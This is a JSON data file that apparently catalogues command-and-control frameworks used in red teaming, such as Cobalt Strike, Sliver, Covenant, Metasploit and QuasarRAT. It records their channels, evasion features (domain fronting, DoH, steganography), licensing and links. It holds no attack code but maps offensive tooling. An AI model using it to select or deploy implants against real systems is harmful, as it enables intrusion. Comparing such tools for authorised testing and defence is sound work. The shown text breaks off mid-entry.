{"c2_data": {"Pupy": {"HTTP": "", "Implementation": "", "DomainFront": "", "Multi-User": "No", "SMB": "", "Kill Date": "", "macOS": "No", "GitHub": "https://github.com/n1nj4sec/pupy", "Key Exchange": "", "Chaining": "", "Price": "NA", "TCP": "", "Proxy Aware": "", "HTTP3": "", "HTTP2": "", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "No", "FTP": "", "Version Reviewed": "", "Logging": "", "Name": "Pupy", "License": "BSD3", "Windows": "Yes", "Stego": "", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "", "DNS": "", "Custom Profile": "", "ICMP": "", "Slack Members": "NA", "IMAP": "", "DoH": "", "Jitter": "", "How-To": "https://www.hackingarticles.in/command-control-tool-pupy/", "ATT&CK Mapping": "", "Kali": "", "Twitter": "@n1nj4sec", "MAPI": "", "Site": "", "Agent": "Python", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "596"}, "Merlin": {"HTTP": "Yes", "Implementation": "Binary", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "Yes", "macOS": "Yes", "GitHub": "https://github.com/Ne0nd0g/merlin", "Key Exchange": "aPAKE OPAQUE", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "Yes", "HTTP2": "Yes", "Date": "11/4/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "#merlin bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "0.8.0", "Logging": "Yes", "Name": "Merlin", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "Domain Front possible by custom compile; QUIC (UDP) Channel; Proxy capable but hard coded and only HTTP", "Server": "Go", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "278", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://www.hackingarticles.in/command-and-control-guide-to-merlin/", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@merlin_c2", "MAPI": "No", "Site": "http://medium.com/@Ne0nd0g", "Agent": "Go", "API": "No", "UI": "GUI", "Linux": "Yes", "GH Issues": "57"}, "Cobalt Strike": {"HTTP": "Yes", "Implementation": "binary", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "Yes", "Kill Date": "Yes", "macOS": "No", "GitHub": "", "Key Exchange": "Yes", "Chaining": "Yes", "Price": "$3,500", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/20/2019", "Evaluator": "@TimMedin", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "3.14", "Logging": "Yes", "Name": "Cobalt Strike", "License": "Commercial", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Java", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "Yes", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://www.cobaltstrike.com/", "ATT&CK Mapping": "Yes", "Kali": "", "Twitter": "", "MAPI": "No", "Site": "https://www.cobaltstrike.com/", "Agent": "Java", "API": "No", "UI": "GUI", "Linux": "No", "GH Issues": "NA"}, "SK8PARK/RAT": {"HTTP": "Yes", "Implementation": "", "DomainFront": "", "Multi-User": "", "SMB": "No", "Kill Date": "", "macOS": "No", "GitHub": "https://github.com/slyd0g/", "Key Exchange": "Encrypted Key Exchange", "Chaining": "", "Price": "", "TCP": "No", "Proxy Aware": "", "HTTP3": "No", "HTTP2": "No", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "No", "FTP": "No", "Version Reviewed": "", "Logging": "", "Name": "SK8PARK/RAT", "License": "NA", "Windows": "Yes", "Stego": "No", "Notes": "SK8PARK is server and SK8RAT is implant", "Server": "Python", "Actively Maint.": "No", "Dashboard": "", "DNS": "No", "Custom Profile": "", "ICMP": "No", "Slack Members": "", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://vimeo.com/394067524", "ATT&CK Mapping": "", "Kali": "", "Twitter": "@slyd0g", "MAPI": "No", "Site": "", "Agent": "C++", "API": "Yes", "UI": "", "Linux": "No", "GH Issues": "0"}, "QuasarRAT": {"HTTP": "", "Implementation": "", "DomainFront": "", "Multi-User": "", "SMB": "", "Kill Date": "", "macOS": "", "GitHub": "https://github.com/quasar/QuasarRAT", "Key Exchange": "", "Chaining": "", "Price": "NA", "TCP": "", "Proxy Aware": "", "HTTP3": "", "HTTP2": "", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "No", "FTP": "", "Version Reviewed": "", "Logging": "", "Name": "QuasarRAT", "License": "MIT", "Windows": "", "Stego": "", "Notes": "", "Server": "", "Actively Maint.": "Yes", "Dashboard": "", "DNS": "", "Custom Profile": "", "ICMP": "", "Slack Members": "NA", "IMAP": "", "DoH": "", "Jitter": "", "How-To": "", "ATT&CK Mapping": "", "Kali": "", "Twitter": "", "MAPI": "", "Site": "", "Agent": "", "API": "", "UI": "", "Linux": "", "GH Issues": "529"}, "FlyingAFalseFlag": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/monoxgas/FlyingAFalseFlag", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/12/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "POC", "Logging": "No", "Name": "FlyingAFalseFlag", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "PostOffice EWS SendGrid & Addendum VirusTotal", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "", "MAPI": "No", "Site": "", "Agent": "C++", "API": "No", "UI": "CLI", "Linux": "No", "GH Issues": "1"}, "WEASEL": {"HTTP": "No", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "No", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/facebookincubator/WEASEL", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "12/3/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "1", "Logging": "No", "Name": "WEASEL", "License": "MIT", "Windows": "Yes", "Stego": "No", "Notes": "Beacons via DNS", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "Yes", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@ucsenoi", "MAPI": "No", "Site": "", "Agent": "Python", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "3"}, "PoshC2": {"HTTP": "Yes", "Implementation": "install.sh", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "", "Kill Date": "Yes", "macOS": "Yes", "GitHub": "https://github.com/nettitude/PoshC2/", "Key Exchange": "TLS", "Chaining": "Yes", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/13/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "poshc2.slack.com", "FTP": "No", "Version Reviewed": "5", "Logging": "Yes", "Name": "PoshC2", "License": "BSD3", "Windows": "Yes", "Stego": "No", "Notes": "Many payloads. PoshC2 is current, older version is at: https://github.com/nettitude/PoshC2_Old/", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@Nettitude_Labs", "MAPI": "No", "Site": "https://poshc2.readthedocs.io/en/latest/", "Agent": "PowerShell/C#/Python", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "44"}, "SilentTrinity": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/byt3bl33d3r/SILENTTRINITY", "Key Exchange": "ECDHE", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/13/2019", "Evaluator": "@0sm0s1z", "Working Hours": "No", "Slack": "#silenttrinity bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "0.4.6dev", "Logging": "Yes", "Name": "SilentTrinity", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "489", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://github.com/byt3bl33d3r/SILENTTRINITY/wiki", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@byt3bl33d3r", "MAPI": "No", "Site": "", "Agent": "IronPython", "API": "No", "UI": "CLI", "Linux": "No", "GH Issues": "67"}, "godoh": {"HTTP": "No", "Implementation": "binary", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/sensepost/goDoH", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "10/31/2019", "Evaluator": "@cabbagesalad2", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "1.6", "Logging": "No", "Name": "godoh", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Go", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "Yes", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "Yes", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@leonjza", "MAPI": "No", "Site": "", "Agent": "Go", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "1"}, "Sliver": {"HTTP": "Yes", "Implementation": "Binary", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/BishopFox/sliver", "Key Exchange": "mTLS", "Chaining": "No", "Price": "NA", "TCP": "Yes", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/5/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "0.0.6-alpha", "Logging": "No", "Name": "Sliver", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "Good for evasion", "Server": "Go", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "Yes", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@LittleJoeTables @rkervell @bishopfox", "MAPI": "No", "Site": "", "Agent": "Go", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "131"}, "Covenant": {"HTTP": "Yes", "Implementation": "Docker", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "Yes", "Kill Date": "Yes", "macOS": "No", "GitHub": "https://github.com/cobbr/Covenant", "Key Exchange": "Encrypted Key Exchange", "Chaining": "Yes", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "10/6/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "#covenant bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "0.3", "Logging": "Yes", "Name": "Covenant", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "C#", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "665", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://github.com/cobbr/Covenant/wiki", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "@cobbr_io", "MAPI": "No", "Site": "https://cobbr.io/tags#covenant", "Agent": "C#", "API": "Yes", "UI": "Web", "Linux": "No", "GH Issues": "108"}, "Nuages": {"HTTP": "Yes", "Implementation": "setup.sh", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/p3nt4/Nuages", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/12/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "POC", "Logging": "No", "Name": "Nuages", "License": "NA", "Windows": "Yes", "Stego": "No", "Notes": "Everything is custom built.", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://github.com/p3nt4/Nuages/wiki", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "", "MAPI": "No", "Site": "", "Agent": "C#", "API": "Yes", "UI": "GUI", "Linux": "No", "GH Issues": "0"}, "INNUENDO": {"HTTP": "Yes", "Implementation": "install.sh", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "Yes", "Kill Date": "No", "macOS": "Yes", "GitHub": "", "Key Exchange": "Encrypted Key Exchange", "Chaining": "Yes", "Price": "Contact Sales", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/11/2019", "Evaluator": "@daveaitel", "Working Hours": "No", "Slack": "No", "FTP": "Yes", "Version Reviewed": "1.7", "Logging": "Yes", "Name": "INNUENDO", "License": "Commercial", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "Yes", "Custom Profile": "Yes", "ICMP": "Yes", "Slack Members": "NA", "IMAP": "Yes", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "", "MAPI": "Yes", "Site": "https://www.immunityinc.com/products/innuendo/", "Agent": "Python", "API": "Yes", "UI": "Web", "Linux": "Yes", "GH Issues": "NA"}, "ReverseTCPShell": {"HTTP": "No", "Implementation": "PowerShell", "DomainFront": "No", "Multi-User": "No", "SMB": "No", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/ZHacker13/ReverseTCPShell", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "Yes", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "12/19/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "NA", "Logging": "No", "Name": "ReverseTCPShell", "License": "NA", "Windows": "Yes", "Stego": "No", "Notes": "Direct, constant TCP connection", "Server": "PowerShell", "Actively Maint.": "No", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@ZHacker13", "MAPI": "No", "Site": "", "Agent": "PowerShell", "API": "No", "UI": "CLI", "Linux": "No", "GH Issues": "0"}, "Dali": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "No", "Kill Date": "No", "macOS": "BYOI", "GitHub": "https://github.com/h0mbre/Dali", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "12/24/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "POC", "Logging": "No", "Name": "Dali", "License": "MIT", "Windows": "BYOI", "Stego": "Yes", "Notes": "Uses Imgur", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@h0mbre_", "MAPI": "No", "Site": "https://h0mbre.github.io/Image_Based_C2_PoC/", "Agent": "Python", "API": "No", "UI": "CLI", "Linux": "BYOI", "GH Issues": "0"}, "C3": {"HTTP": "", "Implementation": "", "DomainFront": "", "Multi-User": "", "SMB": "", "Kill Date": "", "macOS": "", "GitHub": "https://github.com/mwrlabs/C3", "Key Exchange": "", "Chaining": "", "Price": "NA", "TCP": "", "Proxy Aware": "", "HTTP3": "", "HTTP2": "", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "#c3 bloodhoundgang.herokuapp.com", "FTP": "", "Version Reviewed": "1.0.0", "Logging": "", "Name": "C3", "License": "BSD3", "Windows": "", "Stego": "", "Notes": "", "Server": "", "Actively Maint.": "Yes", "Dashboard": "", "DNS": "", "Custom Profile": "", "ICMP": "", "Slack Members": "121", "IMAP": "", "DoH": "", "Jitter": "", "How-To": "", "ATT&CK Mapping": "", "Kali": "", "Twitter": "", "MAPI": "No", "Site": "https://labs.mwrinfosecurity.com/tools/c3/", "Agent": "", "API": "", "UI": "", "Linux": "", "GH Issues": "6"}, "CALDERA": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/mitre/caldera", "Key Exchange": "None", "Chaining": "Yes", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "10/6/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "2", "Logging": "Yes", "Name": "CALDERA", "License": "Apache 2", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "https://github.com/mitre/caldera/wiki", "ATT&CK Mapping": "Yes", "Kali": "", "Twitter": "", "MAPI": "No", "Site": "No", "Agent": "Go", "API": "Yes", "UI": "Web", "Linux": "Yes", "GH Issues": "181"}, "Metasploit": {"HTTP": "Yes", "Implementation": "Ruby", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "Yes", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/rapid7/metasploit-framework", "Key Exchange": "RSA", "Chaining": "Yes", "Price": "NA", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "12/4/2019", "Evaluator": "@busterbcook", "Working Hours": "No", "Slack": "metasploit.slack.com", "FTP": "No", "Version Reviewed": "5.0.62", "Logging": "Yes", "Name": "Metasploit", "License": "BSD3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Ruby", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "4653", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@metasploit", "MAPI": "No", "Site": "https://metasploit.com", "Agent": "C/Java/PHP/Python", "API": "Yes", "UI": "CLI", "Linux": "Yes", "GH Issues": "3953"}, "Apfell": {"HTTP": "Yes", "Implementation": "Docker", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/its-a-feature/Apfell", "Key Exchange": "Encrypted Key Exchange", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "10/6/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "#ApFell bloodhoundgang.herokuapp.com", "FTP": "No", "Version Reviewed": "1.3", "Logging": "Yes", "Name": "Apfell", "License": "BSD3", "Windows": "No", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "180", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://docs.apfell.net/", "ATT&CK Mapping": "Yes", "Kali": "", "Twitter": "@its_a_feature_", "MAPI": "No", "Site": "", "Agent": "Python", "API": "Yes", "UI": "Web", "Linux": "Yes", "GH Issues": "14"}, "redViper": {"HTTP": "", "Implementation": "", "DomainFront": "", "Multi-User": "", "SMB": "", "Kill Date": "", "macOS": "", "GitHub": "https://github.com/itsKindred/redViper", "Key Exchange": "", "Chaining": "", "Price": "NA", "TCP": "", "Proxy Aware": "", "HTTP3": "", "HTTP2": "", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "No", "FTP": "", "Version Reviewed": "", "Logging": "", "Name": "redViper", "License": "NA", "Windows": "", "Stego": "", "Notes": "", "Server": "", "Actively Maint.": "Yes", "Dashboard": "", "DNS": "", "Custom Profile": "", "ICMP": "", "Slack Members": "NA", "IMAP": "", "DoH": "", "Jitter": "", "How-To": "", "ATT&CK Mapping": "", "Kali": "", "Twitter": "", "MAPI": "", "Site": "", "Agent": "", "API": "", "UI": "", "Linux": "", "GH Issues": "0"}, "Meterpeter": {"HTTP": "", "Implementation": "", "DomainFront": "", "Multi-User": "", "SMB": "", "Kill Date": "", "macOS": "", "GitHub": "https://github.com/r00t-3xp10it/meterpeter", "Key Exchange": "", "Chaining": "", "Price": "", "TCP": "", "Proxy Aware": "", "HTTP3": "", "HTTP2": "", "Date": "", "Evaluator": "", "Working Hours": "", "Slack": "No", "FTP": "", "Version Reviewed": "", "Logging": "", "Name": "Meterpeter", "License": "NA", "Windows": "", "Stego": "", "Notes": "", "Server": "", "Actively Maint.": "Yes", "Dashboard": "", "DNS": "", "Custom Profile": "", "ICMP": "", "Slack Members": "NA", "IMAP": "", "DoH": "", "Jitter": "", "How-To": "https://github.com/r00t-3xp10it/meterpeter", "ATT&CK Mapping": "", "Kali": "", "Twitter": "", "MAPI": "", "Site": "", "Agent": "", "API": "", "UI": "", "Linux": "", "GH Issues": "0"}, "Throwback": {"HTTP": "Yes", "Implementation": "shell script", "DomainFront": "No", "Multi-User": "Yes", "SMB": "No", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/silentbreaksec/Throwback", "Key Exchange": "RC4", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "2/24/2020", "Evaluator": "@malcomvetter", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "Aug 2017", "Logging": "No", "Name": "Throwback", "License": "GNU GPL2", "Windows": "Yes", "Stego": "No", "Notes": "No updates in 5 years; web UI not authenticated", "Server": "php", "Actively Maint.": "No", "Dashboard": "Yes", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://silentbreaksecurity.com/throwback-thursday-a-guide-to-configuring-throwback/", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@SilentBreakSec", "MAPI": "No", "Site": "", "Agent": "C++", "API": "No", "UI": "Web", "Linux": "No", "GH Issues": "1"}, "SCYTHE": {"HTTP": "Yes", "Implementation": "Binary", "DomainFront": "Yes", "Multi-User": "Yes", "SMB": "Yes", "Kill Date": "Yes", "macOS": "Yes", "GitHub": "", "Key Exchange": "Curve25519", "Chaining": "Yes", "Price": "Contact Sales", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "11/13/2019", "Evaluator": "@Adam_Mashinchi", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "2.5", "Logging": "Yes", "Name": "SCYTHE", "License": "Commercial", "Windows": "Yes", "Stego": "Yes", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "Yes", "DNS": "Yes", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "Yes", "Kali": "", "Twitter": "@scythe_io", "MAPI": "No", "Site": "https://scythe.io", "Agent": "C", "API": "Yes", "UI": "Web", "Linux": "Yes", "GH Issues": "NA"}, "Koadic C3": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "Yes", "macOS": "No", "GitHub": "https://github.com/zerosum0x0/koadic", "Key Exchange": "None", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "9/27/2019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "0xA (10)", "Logging": "Yes", "Name": "Koadic C3", "License": "Apache 2", "Windows": "Yes", "Stego": "No", "Notes": "Requires valid cert for HTTPS", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "https://www.hackingarticles.in/koadic-com-command-control-framework/", "ATT&CK Mapping": "No", "Kali": "Yes", "Twitter": "", "MAPI": "No", "Site": "No", "Agent": "JScript/VBScript", "API": "No", "UI": "GUI", "Linux": "No", "GH Issues": "94"}, "Voodoo": {"HTTP": "Yes", "Implementation": "run.py", "DomainFront": "No", "Multi-User": "Yes", "SMB": "No", "Kill Date": "Yes", "macOS": "Yes", "GitHub": "", "Key Exchange": "TLS + ChaCha20-Poly1305", "Chaining": "Yes", "Price": "$2,000", "TCP": "Yes", "Proxy Aware": "Yes", "HTTP3": "No", "HTTP2": "No", "Date": "2/12/2020", "Evaluator": "@kevinlustic", "Working Hours": "No", "Slack": "s2universe.slack.com", "FTP": "No", "Version Reviewed": "0.2.3", "Logging": "Yes", "Name": "Voodoo", "License": "Commercial", "Windows": "Yes", "Stego": "No", "Notes": "Community edition available for evaluation and linked off the main site", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "No", "ICMP": "No", "Slack Members": "189", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@professor__plum", "MAPI": "No", "Site": "https://www.voodooops.com/", "Agent": "C++", "API": "No", "UI": "Web", "Linux": "Yes", "GH Issues": "NA"}, "Octopus": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "No", "Kill Date": "No", "macOS": "No", "GitHub": "https://github.com/mhaskar/Octopus", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "12/12/12019", "Evaluator": "@jorgeorchilles", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "v1.0 Beta", "Logging": "No", "Name": "Octopus", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "No", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@mohammadaskar2", "MAPI": "No", "Site": "https://shells.systems/unveiling-octopus-the-pre-operation-c2-for-red-teamers/", "Agent": "PowerShell", "API": "No", "UI": "GUI", "Linux": "No", "GH Issues": "3"}, "Trevor C2": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/trustedsec/trevorc2/", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "10/16/2019", "Evaluator": "@cabbagesalad2", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "1.1", "Logging": "No", "Name": "Trevor C2", "License": "BSD3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", "DoH": "No", "Jitter": "Yes", "How-To": "", "ATT&CK Mapping": "No", "Kali": "", "Twitter": "@HackingDave", "MAPI": "No", "Site": "", "Agent": "Python/PowerShell", "API": "No", "UI": "CLI", "Linux": "Yes", "GH Issues": "5"}, "EvilOSX": {"HTTP": "Yes", "Implementation": "pip3", "DomainFront": "No", "Multi-User": "No", "SMB": "", "Kill Date": "No", "macOS": "Yes", "GitHub": "https://github.com/Marten4n6/EvilOSX", "Key Exchange": "AES", "Chaining": "No", "Price": "NA", "TCP": "No", "Proxy Aware": "No", "HTTP3": "No", "HTTP2": "No", "Date": "11/12/2019", "Evaluator": "@cabbagesalad2", "Working Hours": "No", "Slack": "No", "FTP": "No", "Version Reviewed": "7.2.1", "Logging": "No", "Name": "EvilOSX", "License": "GNU GPL3", "Windows": "Yes", "Stego": "No", "Notes": "", "Server": "Python", "Actively Maint.": "Yes", "Dashboard": "No", "DNS": "No", "Custom Profile": "Yes", "ICMP": "No", "Slack Members": "NA", "IMAP": "No", 